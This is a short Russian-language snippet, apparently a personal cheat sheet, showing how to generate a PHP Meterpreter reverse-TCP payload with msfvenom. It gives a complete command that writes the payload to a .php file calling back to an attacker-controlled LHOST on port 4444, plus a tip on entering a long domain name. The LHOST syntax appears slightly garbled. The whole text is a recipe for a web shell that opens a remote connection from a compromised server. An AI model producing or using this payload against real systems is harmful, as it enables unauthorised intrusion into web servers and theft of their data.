Генерируем payload php в msfvenom.
Пример:
msfvenom -p php/meterpreter_reverse_tcp LHOST ip_адрес LPORT=4444 -f raw > meterpreter_reverse_tcp.php
p.s. Если в LHOST длинное доменное имя, то пишем LHOSTдоменное_имя (слитно)